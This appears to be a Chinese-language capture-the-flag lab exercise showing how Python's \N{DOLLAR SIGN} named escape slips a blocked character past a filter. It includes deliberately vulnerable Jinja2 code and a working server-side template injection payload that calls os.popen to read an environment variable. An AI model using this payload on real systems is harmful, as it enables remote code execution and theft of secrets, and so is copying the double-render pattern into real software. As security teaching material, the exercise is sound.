# 利用未知语法 - 字符名称

Python3 允许使用 Unicode、十六进制和八进制表示法，这与大多数其他编程语言类似。然而，[Python 还允许你使用字符名称来指定字符](https://docs.python.org/3/howto/unicode.html)。例如，你可以将美元符号（`$`）写为：`\N{DOLLAR SIGN}`。如果你能够在应用程序中使用此技术，它就可以用来绕过防火墙等保护机制，或走私那些通常被过滤的字符。

### Exploiting Unknown Syntaxes - Character Name 

该 Web 应用程序提供了一款在线游戏，玩家需要捕获旗帜并避开所有隐藏的地雷。你能成功捕获旗帜吗？

该 Web 应用程序似乎存在 SSTI（服务器端模板注入）漏洞，但我们无法输入美元符号（`$`）来进行利用，或者真的可以吗？

注意：标志位于名为 `FLAG` 的环境变量中。

目标

找到一种利用 SSTI 执行远程代码执行（RCE）的方法，从而获得对易受攻击的 Web 应用程序的访问权限。

code

```py
import re
from urllib.parse import unquote
from jinja2 import Environment, Template, FileSystemLoader

# We used to use Mako as a template engine
env = Environment(
    autoescape=False,
    loader=FileSystemLoader('./templates'),
    variable_start_string="${",
    variable_end_string="}",
    block_start_string="<%",
    block_end_string="%>",
)

def escape(value:str) -> str:
    # If the review seems to be malicious, make a good review instead
    if re.search(r"(\\[xu0-9]|\$)", value, re.IGNORECASE):
        value = "You hit a mine!"
    else:    
        value = ( bytes(value, "utf-8").decode("unicode_escape") )

    return value

def showResult(value:str) -> str:
        return env.from_string('''
        <% extends "index.html" %>
        <% block result %>
                <span>No player found named: ${ query } </span>
        <% endblock %>
        ''').render(query=escape(value))    

# 渲染两次 
result = showResult(unquote("§输入§"))

print( env.from_string(result).render() )

```

输入
```
\N{DOLLAR SIGN}{ cycler.__init__.__globals__.os.popen('env | grep FLAG').read() }
```
